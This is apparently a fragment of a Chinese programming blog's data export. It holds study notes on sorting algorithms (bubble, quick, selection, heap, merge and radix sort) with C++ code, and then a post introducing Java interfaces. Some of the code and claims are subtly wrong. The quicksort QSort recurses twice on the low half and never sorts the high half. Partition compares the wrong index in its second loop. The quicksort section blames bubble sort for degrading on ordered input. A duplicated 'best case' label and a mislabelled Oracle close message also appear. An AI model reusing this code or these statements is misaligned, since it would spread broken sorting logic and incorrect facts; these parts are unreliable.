href=\"#冒泡排序算法改进\" class=\"headerlink\" title=\"冒泡排序算法改进\"></a>冒泡排序算法改进</h5><p>如果某一趟发现没有产生任何交换,则说明该序列已经有序,后面的几趟就不需要比了,所以可以做出冒泡算法的改进</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">bubble_sort</span><span class=\"params\">(SqList &amp;L)</span></span>&#123;<span class=\"comment\">//改进的冒泡算法</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> m,i,j,flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">    RedType x;<span class=\"comment\">//temp变量</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(m=<span class=\"number\">1</span>;m&lt;n<span class=\"number\">-1</span>&amp;&amp;flag==<span class=\"number\">1</span>;m++)&#123;</span><br><span class=\"line\">        flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(j=<span class=\"number\">1</span>;j&lt;=m;j++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(L.r[j].key&gt;L.r[j+<span class=\"number\">1</span>].key)&#123;<span class=\"comment\">//发生逆序</span></span><br><span class=\"line\">                flag=<span class=\"number\">1</span>;<span class=\"comment\">//发生交换,flag置为1,若本趟没发生交换,flag保持为0</span></span><br><span class=\"line\">                x=L.r[j];</span><br><span class=\"line\">                L.r[j]=L.r[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">                L.r[j+<span class=\"number\">1</span>]=x;<span class=\"comment\">//交换</span></span><br><span class=\"line\">            &#125;<span class=\"comment\">//endif</span></span><br><span class=\"line\">        &#125;<span class=\"comment\">//for</span></span><br><span class=\"line\">    &#125;<span class=\"comment\">//for</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>优点</strong>:每趟结束时,不仅能挤出一个最大值到最后面位置,还能同时部分理顺其他元素</p>\n<h5 id=\"时间复杂度-3\"><a href=\"#时间复杂度-3\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><ul>\n<li>最好情况(正序)<ul>\n<li>比较次数:n-1</li>\n<li>移动次数:0</li>\n</ul>\n</li>\n</ul>\n<p>时间复杂度 O(n)</p>\n<ul>\n<li>最坏情况(逆序)<ul>\n<li>比较次数:1/2(n2-n)</li>\n<li>移动次数:3/2(n2-n)</li>\n</ul>\n</li>\n</ul>\n<p>时间复杂度O(n2)</p>\n<p><strong>平均时间复杂度O(n2)</strong></p>\n<p><strong>空间复杂度O(1)</strong></p>\n<h3 id=\"快速排序\"><a href=\"#快速排序\" class=\"headerlink\" title=\"快速排序\"></a>快速排序</h3><p><strong>快速排序算法是不稳定的</strong></p>\n<p><strong>快速排序算法不是自然排序方法</strong></p>\n<h5 id=\"基本思想\"><a href=\"#基本思想\" class=\"headerlink\" title=\"基本思想:\"></a>基本思想:</h5><ul>\n<li>任取一个元素为中心(枢轴)</li>\n<li>所有比它小的元素往前放,比他大的元素往后放,形成左右两个子表</li>\n<li>对各个子表重新选择中心元素并依次规则调整</li>\n<li>直到每个子表的元素只剩一个</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Partition</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> high)</span></span>&#123;</span><br><span class=\"line\">    L.r[<span class=\"number\">0</span>]=L.r[low];</span><br><span class=\"line\">    pivotkey=L.r[low].key;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(low&lt;high)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(low&lt;high&amp;&amp;L.r[high].key&gt;=pivotkey)</span><br><span class=\"line\">            --high;</span><br><span class=\"line\">        L.r[low]=L.r[high];</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(low&lt;high&amp;&amp;L.r[high].key&lt;=pivotkey)</span><br><span class=\"line\">            ++low;</span><br><span class=\"line\">        L.r[high]=L.r[low];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    L.r[low]=L.r[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> low;<span class=\"comment\">//返回枢轴最终的位置</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">QSort</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> high)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(low &lt;high)&#123;<span class=\"comment\">//low==high即各个子表都只有一个元素</span></span><br><span class=\"line\">        pivotloc=<span class=\"built_in\">Partition</span>(L,low,high);</span><br><span class=\"line\">        <span class=\"comment\">//将L.r[low...high]一分为二,pivotloc为枢轴元素排好序的位置</span></span><br><span class=\"line\">        <span class=\"built_in\">QSort</span>(L,low,pivotloc<span class=\"number\">-1</span>);<span class=\"comment\">//对低子表递归排序</span></span><br><span class=\"line\">        <span class=\"built_in\">QSort</span>(L,low,pivotloc<span class=\"number\">-1</span>);<span class=\"comment\">//对高子表递归排序     </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">QSort</span>(L,<span class=\"number\">1</span>,L.length);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"时间复杂度O-nlog2n\"><a href=\"#时间复杂度O-nlog2n\" class=\"headerlink\" title=\"时间复杂度O(nlog2n)\"></a>时间复杂度O(nlog2n)</h5><ul>\n<li>QSort(); ——O(log2n)</li>\n<li>Partition();——-O(n)</li>\n</ul>\n<p>实验结果表明,就平均计算时间而言,快速排序是我们所讨论的所有内排序方法中最好的一个</p>\n<h5 id=\"空间复杂度-2\"><a href=\"#空间复杂度-2\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h5><p>快速排序不是原地排序</p>\n<p>由于程序中使用了递归,需要递归调用栈的支持,而栈的长度取决于递归调用的深度,(即使不用递归,也需要用用户栈)</p>\n<ul>\n<li>在平均情况下需要O(log2n)的栈空间</li>\n<li>最快情况下:栈空间可达O(n)</li>\n</ul>\n<h5 id=\"注意-1\"><a href=\"#注意-1\" class=\"headerlink\" title=\"注意\"></a>注意</h5><ul>\n<li>冒泡排序不适合对原本有序或者基本有序的记录序列进行排序,此时会退化成没有改进的<strong>冒泡排序</strong>时间复杂度O(n2)</li>\n</ul>\n<h3 id=\"简单选择排序\"><a href=\"#简单选择排序\" class=\"headerlink\" title=\"简单选择排序\"></a>简单选择排序</h3><p><strong>简单选择排序算法是不稳定的</strong></p>\n<p>基本思想:在待排序的数据中选出最大(小)的元素放在其最终的位置</p>\n<p>基本操作</p>\n<ol>\n<li>首先通过n-1次关键字比较,从n个记录中找出关键字最小的记录,将它与第一个记录交换</li>\n<li>再通过n-2次比较,从剩余的n-1个记录中找出关键字次小的记录,将它与第二个记录交换</li>\n<li>重复上述操作,共进行n-1趟排序后,排序结束</li>\n</ol>\n<p>移动次数</p>\n<ul>\n<li>最好情况 0</li>\n<li>最好情况 3(n-1)</li>\n</ul>\n<p><strong>比较次数是”定”值</strong>n(n-1)/2</p>\n<h5 id=\"时间复杂度-4\"><a href=\"#时间复杂度-4\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><p>O(n2)</p>\n<h3 id=\"堆排序\"><a href=\"#堆排序\" class=\"headerlink\" title=\"堆排序\"></a>堆排序</h3><p><strong>堆排序是不稳定的</strong></p>\n<p>若在输出对堆顶的最小值(最大值)后,使得剩余n-1个元素的序列又建成一个堆,则得到n个元素的次小值(次大值)….如此反复,便能得到一个有序序列,这个过程称之为堆排序</p>\n<h5 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h5><p>在数据元素各种情况下时间复杂度都是O(nlog2n)</p>\n<h4 id=\"如何调整剩余元素成为一个新的堆\"><a href=\"#如何调整剩余元素成为一个新的堆\" class=\"headerlink\" title=\"如何调整剩余元素成为一个新的堆\"></a>如何调整剩余元素成为一个新的堆</h4><h5 id=\"小根堆\"><a href=\"#小根堆\" class=\"headerlink\" title=\"小根堆\"></a>小根堆</h5><ol>\n<li>输出堆顶元素之后,以堆中最后一个元素替代之,(堆中元素一般用顺序存储结构)</li>\n<li>然后将根节点值与左,右子树的根节点值进行比较,并与区中小者进行交换</li>\n<li>重复上述操作,直到叶子结点,将得到新的堆,称这个从顶堆至叶子的调整过程为”筛选”</li>\n</ol>\n<h5 id=\"大根堆\"><a href=\"#大根堆\" class=\"headerlink\" title=\"大根堆\"></a>大根堆</h5><p>同上</p>\n<h4 id=\"堆的建立\"><a href=\"#堆的建立\" class=\"headerlink\" title=\"堆的建立\"></a>堆的建立</h4><p>单节点的二叉树是堆</p>\n<p>在完全二叉树中所有以叶子结点(序号i&gt;n/2)为根的子树是堆</p>\n<p>这样,只需依次将以序号为n/2,n/2-1,n/2-2,…,1的结点为根的子树均调整为堆即可</p>\n<h5 id=\"时间复杂度O-nlog2n-1\"><a href=\"#时间复杂度O-nlog2n-1\" class=\"headerlink\" title=\"时间复杂度O(nlog2n)\"></a>时间复杂度O(nlog2n)</h5><p>O(n)+O(nlog2n)=O(nlog2n)</p>\n<p>初始化堆所需时间不超过—O(n)</p>\n<p>排序阶段(不含初始化堆)—O(nlog2n)</p>\n<h5 id=\"空间复杂度O-1\"><a href=\"#空间复杂度O-1\" class=\"headerlink\" title=\"空间复杂度O(1)\"></a>空间复杂度O(1)</h5><h5 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h5><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">堆排序</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Heap</span> &#123;</span><span class=\"comment\">//创建堆对象</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">       <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">heap</span><span class=\"params\">(<span class=\"keyword\">int</span> arr[],<span class=\"keyword\">int</span> lenth,<span class=\"keyword\">int</span> index)</span></span>&#123;<span class=\"comment\">//创建建立大根堆的函数</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (lenth &lt;= <span class=\"number\">1</span>)</span><br><span class=\"line\">                      <span class=\"keyword\">return</span>;<span class=\"comment\">//当剩余长度小于等于1的时候推出</span></span><br><span class=\"line\">              <span class=\"keyword\">int</span> left = index * <span class=\"number\">2</span> + <span class=\"number\">1</span>;<span class=\"comment\">//左节点等于父节点*2+1</span></span><br><span class=\"line\">              <span class=\"keyword\">int</span> right = index * <span class=\"number\">2</span> + <span class=\"number\">2</span>;<span class=\"comment\">//右节点等于父节点*2+2</span></span><br><span class=\"line\">              <span class=\"keyword\">int</span> max = index;<span class=\"comment\">//初始化一个max为传入的根节点</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (left&lt;lenth &amp;&amp; arr[left]&gt;arr[max])</span><br><span class=\"line\">                      max = left;<span class=\"comment\">//判断子节点是否大于父节点,并且更改max指向的值</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (right&lt;lenth &amp;&amp; arr[right]&gt;arr[max])</span><br><span class=\"line\">                      max = right;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (arr[index] != arr[max]) &#123;<span class=\"comment\">//判断根节点是否为最大值,若不是则交换</span></span><br><span class=\"line\">                      <span class=\"built_in\">swap</span>(arr[index], arr[max]);</span><br><span class=\"line\">                      <span class=\"built_in\">heap</span>(arr, lenth, max);<span class=\"comment\">//递归调用,将</span></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">                             </span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">heapSort</span><span class=\"params\">(<span class=\"keyword\">int</span> arr[], <span class=\"keyword\">int</span> size)</span> </span>&#123;</span><br><span class=\"line\">              <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = size / <span class=\"number\">2</span> - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">                      <span class=\"built_in\">heap</span>(arr, size, i);<span class=\"comment\">//建立一个大根堆</span></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = size - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">1</span>; i--) &#123;</span><br><span class=\"line\">                      <span class=\"built_in\">swap</span>(arr[<span class=\"number\">0</span>], arr[i]);</span><br><span class=\"line\">                      <span class=\"built_in\">heap</span>(arr, i, <span class=\"number\">0</span>);<span class=\"comment\">//重新调整大根堆</span></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">       Heap A;</span><br><span class=\"line\">       <span class=\"keyword\">int</span> arr[<span class=\"number\">5</span>] = &#123; <span class=\"number\">5</span>,<span class=\"number\">7</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">8</span> &#125;;</span><br><span class=\"line\">       A.<span class=\"built_in\">heapSort</span>(arr, <span class=\"number\">5</span>);</span><br><span class=\"line\">       <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">              cout &lt;&lt; arr[i] &lt;&lt; endl;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"归并排序\"><a href=\"#归并排序\" class=\"headerlink\" title=\"归并排序\"></a>归并排序</h3><p><strong>归并排序是稳定的</strong></p>\n<h5 id=\"时间复杂度O-nlog2n-2\"><a href=\"#时间复杂度O-nlog2n-2\" class=\"headerlink\" title=\"时间复杂度O(nlog2n)\"></a>时间复杂度O(nlog2n)</h5><h5 id=\"空间复杂度O-n\"><a href=\"#空间复杂度O-n\" class=\"headerlink\" title=\"空间复杂度O(n)\"></a>空间复杂度O(n)</h5><p>因为需要一个与原始序列同样大小的辅助序列,这正是此算法的缺点(归并排序后的值往辅助序列中填)</p>\n<h5 id=\"代码实现-递归\"><a href=\"#代码实现-递归\" class=\"headerlink\" title=\"代码实现(递归)\"></a>代码实现(递归)</h5><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">//引入vector是为了定义可变数组</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Merge</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">       <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">merge</span><span class=\"params\">(<span class=\"keyword\">int</span> arr[],<span class=\"keyword\">int</span> left,<span class=\"keyword\">int</span> mid,<span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">              <span class=\"function\">vector&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">help</span><span class=\"params\">(right -left+<span class=\"number\">1</span>)</span></span>;</span><br><span class=\"line\">                  <span class=\"comment\">//定义一个长度为right -left+1的数组,进行内排</span></span><br><span class=\"line\">                <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">              <span class=\"keyword\">int</span> p1 = left, p2 = mid+<span class=\"number\">1</span>;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> (p1 &lt;= mid &amp;&amp; p2 &lt;= right) &#123;</span><br><span class=\"line\">                      help[i++] = arr[p1] &lt; arr[p2] ? arr[p1++] : arr[p2++];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> (p1 &lt;= mid)</span><br><span class=\"line\">                      help[i++] = arr[p1++];</span><br><span class=\"line\">              <span class=\"keyword\">while</span> (p2 &lt;= right)</span><br><span class=\"line\">                      help[i++] = arr[p2++];</span><br><span class=\"line\">              <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; help.<span class=\"built_in\">size</span>(); j++) &#123;</span><br><span class=\"line\">                      arr[left+j] = help[j];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">mergeSort</span><span class=\"params\">(<span class=\"keyword\">int</span> arr[],<span class=\"keyword\">int</span> left,<span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (left == right)</span><br><span class=\"line\">                      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">              <span class=\"keyword\">int</span> mid = left + ((right-left)&gt;&gt; <span class=\"number\">1</span>);</span><br><span class=\"line\">              <span class=\"built_in\">mergeSort</span>(arr, left, mid);</span><br><span class=\"line\">              <span class=\"built_in\">mergeSort</span>(arr, mid + <span class=\"number\">1</span>, right);</span><br><span class=\"line\">              <span class=\"built_in\">merge</span>(arr, left, mid, right);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">       Merge A;</span><br><span class=\"line\">       <span class=\"keyword\">int</span> arr[<span class=\"number\">10</span>] = &#123; <span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">6</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">3</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">9</span>,<span class=\"number\">87</span> &#125;;</span><br><span class=\"line\">       A.<span class=\"built_in\">mergeSort</span>(arr, <span class=\"number\">0</span>, <span class=\"number\">9</span>);</span><br><span class=\"line\">       <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">              cout &lt;&lt;<span class=\"string\">&quot;  &quot;</span>&lt;&lt; arr[i]&lt;&lt;flush;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基数排序\"><a href=\"#基数排序\" class=\"headerlink\" title=\"基数排序\"></a>基数排序</h3><p>也叫桶排序或箱排序:设置若干个箱子,将关键字为k的记录放入第k个箱子,然后再按照序号将非空的连接</p>\n<p>数字是有范围的,只需要设置0-9十个箱子,相继按照个,十,百,….进行排序</p>\n<h5 id=\"基本思想-1\"><a href=\"#基本思想-1\" class=\"headerlink\" title=\"基本思想\"></a>基本思想</h5><p>分配+收集</p>\n<h5 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h5><ul>\n<li>第一趟收集保证个位有序</li>\n<li>第二趟收集保证十位有序</li>\n<li>………..</li>\n</ul>\n<h5 id=\"时间复杂度O-k-n-m\"><a href=\"#时间复杂度O-k-n-m\" class=\"headerlink\" title=\"时间复杂度O(k*(n+m))\"></a>时间复杂度O(k*(n+m))</h5><ul>\n<li>k: 关键字个数</li>\n<li>m: 关键字取值范围为m个值</li>\n</ul>\n<h5 id=\"空间复杂度O-n-m\"><a href=\"#空间复杂度O-n-m\" class=\"headerlink\" title=\"空间复杂度O(n+m)\"></a>空间复杂度O(n+m)</h5><h2 id=\"各种常见内排序算法复杂度以及稳定性表格\"><a href=\"#各种常见内排序算法复杂度以及稳定性表格\" class=\"headerlink\" title=\"各种常见内排序算法复杂度以及稳定性表格\"></a>各种常见内排序算法复杂度以及稳定性表格</h2><p>自己总结完再填</p>\n<table>\n<thead>\n<tr>\n<th>排序方法</th>\n<th>时间复杂度(平均)</th>\n<th>时间复杂度(最坏)</th>\n<th>时间复杂度(最好)</th>\n<th>空间复杂度</th>\n<th>稳定性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>插入排序</td>\n<td>O(n2)</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>希尔排序</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>直接选择排序</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>"},{"title":"接口","date":"2021-12-24T09:18:19.000Z","typora-root-url":"..","description":"java接口","_content":"\n### 接口\n\n#### 基本介绍\n\n接口就是给出一些没有实现的方法,封装到一起,到某个类要使用的时候,再根据具体情况把这些方法写出来\n\n##### 语法\n\n\n\n```java\ninterface 接口名{\n\n//属性\n\n//方法(三种:1.抽象方法,2.默认实现方法,3.静态方法)\n    //接口中抽象方法可以省略abstract关键字\n//jdk8后可以通过添加default关键字实现默认方法\n    default public void ok(){\n        System.out.println(\"ok\");\n    }\n//jdk8也可以实现静态方法\n}\n///////////////////////////////////////\nclass 类名 implements 接口{//implement 实现\n//自己属性\n//自己方法\n//必须实现的接口的抽象方法\n    \n\n}\n```\n\n\n\n一个例子,通过DBinterface接口规范对于数据库的操作\n\nDBinterface.java\n\n```java\npublic interface DBinterface{\n    public void connect();\n    public void close();\n}\n\n```\n\nmySqlDB.java\n\n```java\npublic class mySqlDB implements DBinterface{\n    @Override\n    public void connect(){\n        System.out.println(\"mysql连接成功\");\n    }\n    @Override\n    public void close(){\n        System.out.println(\"mysql关闭连接\");\n    }\n}\n\n```\n\nOracleDB.java\n\n```java\npublic class OracleDB implements DBinterface{\n    @Override\n    public void connect(){\n        System.out.println(\"oracle连接成功\");\n    }\n    @Override\n    public void close() {\n        System.out.println(\"oracle连接成功\");\n    }\n}\n\n```\n\nt1.java\n\n```java\npublic class t1 {\n    public static void main(String[] args) {\n        mySqlDB mySqlDB=new mySqlDB();\n        connect(mySqlDB);\n        close(mySqlDB);\n        OracleDB oracleDB=new OracleDB();\n        connect(oracleDB);\n    }\n    //能根据传入的对象自动匹配到对应类实现的方法\n    public static void close(DBinterface db){\n        db.close();\n    }\n    public static  void connect(DBinterface db){\n        db.connect();\n    }\n}\n\n```\n\n运行结果:\n\n![image-20211224183152984](/images/%E6%8E%A5%E5%8F%A3/image-20211224183152984.png)\n\n\n\n#### 接口注意事项\n\n##### 1接口不能实例化,(因其本身是一个抽象的概念)\n\n##### 2接口中所有方法都是public方法,接口中的抽象方法,可以不用abstract修饰\n\n​\t接口中`void a(); `实际上是`abstract void a();`\n\n##### 3一个普通类实现接口,就必须将该接口的所有方法都实现\n\n##### 4.一个类可以同时实现多个接口\n\n##### 5.抽象类实现接口,可以不用实现接口的方法\n\n##### 6.接口中的属性,只能是final的,而且是public static final的,比如`int a=1`,实际上是`public static final int a=1;(必须被初始化)`\n\n##### 7.接口中属性的访问形式:接口名.属性名\n\n用final修饰的属性不允许被修改且必须初始化\n\n```java\npublic class S8_3 {\n    public static void main(String[] args) {\n        System.out.println(C.num);//用接口名.属性名的形式类比类中的static属性就间接说明了其的static特性\n    }\n}\ninterface C{\n    int num=1;//等价于public static final int num =1\n}\n\n```\n\n##### 8.一个接口不能继承其他类,但是可以继承多个别的接口\n\n```java\ninterface C{\n    public void hi();\n    int num=1;//等价于public static final int num =1\n}\ninterface B extends C{\n    public void bye();\n}\nclass test1 implements B{\n    @Override\n    public void hi() {\n    }\n    @Override\n    public void bye() {\n\n    }\n}\n```\n\n##### 9.接口的修饰符只能是public和默认,这点和类的修饰符是一样的\n\n","source":"_posts/接口.md","raw":"---\ntitle: 接口\ndate: 2021-12-24 17:18:19\ntags:\n      - 接口interface\n      - java \ncategories: java\ntypora-root-url: ..\ndescription: java接口\n---\n\n### 接口\n\n#### 基本介绍\n\n接口就是给出一些没有实现的方法,封装到一起,到某个类要使用的时候,再根据具体情况把这些方法写出来\n\n##### 语法\n\n\n\n```java\ninterface 接口名{\n\n//属性\n\n//方法(三种:1.抽象方法,2.默认实现方法,3.静态方法)\n    //接口中抽象方法可以省略abstract关键字\n//jdk8后可以通过添加default关键字实现默认方法\n    default public void ok(){\n        System.out.println(\"ok\");\n    }\n//jdk8也可以实现静态方法\n}\n///////////////////////////////////////\nclass 类名 implements 接口{//implement 实现\n//自己属性\n//自己方法\n//必须实现的接口的抽象方法\n    \n\n}\n```\n\n\n\n一个例子,通过DBinterface接口规范对于数据库的操作\n\nDBinterface.java\n\n```java\npublic interface DBinterface{\n    public void connect();\n    public void close();\n}\n\n```\n\nmySqlDB.java\n\n```java\npublic class mySqlDB implements DBinterface{\n    @Override\n    public void connect(){\n        System.out.println(\"mysql连接成功\");\n    }\n    @Override\n    public void close(){\n        System.out.println(\"mysql关闭连接\");\n    }\n}\n\n```\n\nOracleDB.java\n\n```java\npublic class OracleDB implements DBinterface{\n    @Override\n    public void connect(){\n        System.out.println(\"oracle连接成功\");\n    }\n    @Override\n    public void close() {\n        System.out.println(\"oracle连接成功\");\n    }\n}\n\n```\n\nt1.java\n\n```java\npublic 